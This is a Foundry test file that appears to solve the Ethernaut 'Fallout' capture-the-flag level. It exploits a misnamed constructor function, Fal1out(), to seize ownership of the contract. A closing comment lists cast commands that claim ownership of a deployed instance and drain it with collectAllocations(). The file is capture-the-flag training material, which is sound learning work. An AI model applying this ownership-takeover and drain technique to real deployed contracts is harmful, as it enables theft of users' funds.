// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Fallout} from "../src/Fallout.sol";

contract FalloutTest is Test {
    Fallout public falloutContract;
    address public attacker;

    function setUp() public {
        falloutContract = new Fallout();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
    }

    function test_claimOwner() public {
        vm.startPrank(attacker);

        falloutContract.Fal1out();
        assertEq(falloutContract.owner(), attacker);

        vm.stopPrank();
    }
}

/* 
Instance address: 0x5F6E73CA456335830E0A7183e409F925B795eF38
source .env
export Fallout=0x5F6E73CA456335830E0A7183e409F925B795eF38
cast send $Fallout "Fal1out()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast call $Fallout "owner()" --rpc-url $RPC_URL
cast send $Fallout "collectAllocations()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
